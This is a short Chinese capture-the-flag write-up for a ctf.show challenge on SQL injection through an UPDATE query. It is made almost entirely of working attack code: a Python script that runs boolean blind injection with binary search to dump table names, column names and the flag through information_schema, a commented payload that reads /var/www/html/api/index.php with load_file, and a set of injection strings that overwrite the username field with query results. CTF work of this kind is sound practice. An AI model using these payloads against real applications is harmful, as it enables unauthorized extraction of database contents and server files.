# 知识点
# 思路
### 方法一
where后进行布尔盲注
```plsql
import requests
url = 'http://6dba60c7-91d2-4d8d-a0c8-2aeb3115cf71.challenge.ctf.show/api/'
str = ''
x = 1
for i in range(60):
    min,max = 32, 128
    while True:
        j = min + (max-min)//2
        if(min == j):
            str += chr(j)
            print(str)
            break
        # 爆表名
        # payload = {
        #     'username': "ctfshow"+"}"+"' or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{},1))<{},true,false)#".format(i, j),
        #     'password': f"{x}"
        # }
        # 爆列
        # payload = {
        #     'username': "ctfshow"+"}"+"' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flaga'),{},1))<{},true,false)#".format(i, j),
        #     'password': f"{x}"
        # }
        # # 爆值
        payload = {
            'username': "ctfshow"+"}"+"' or if(ascii(substr((select group_concat(flagas) from flaga),{0},1))<{1},true,false)#".format(i, j),
            'password': f"{x}"
        }
        # payload = {'username':f"if(load_file('/var/www/html/api/index.php')regexp('{flag+j}'),0,1)",
        #            'password':0}
        r = requests.post(url=url,data=payload).text
        if(r'\u66f4\u65b0\u6210\u529f' in r):
            max = j
            x += 1
        else:
            min = j
            x += 1
```
### 方法二
在set后的pass进行注入，将pass进行更新，更新我们需要的数据
```plsql
#获取所有表名

password=',username=(select  group_concat(table_name) from information_schema.tables where table_schema=database())%23&username=1

#获取所有列名
password=',username=(select  group_concat(column_name) from information_schema.columns where table_name='flaga')%23&username=1

#获取flag
password=',username=(select  group_concat(flagas) from flaga)%23&username=1


```
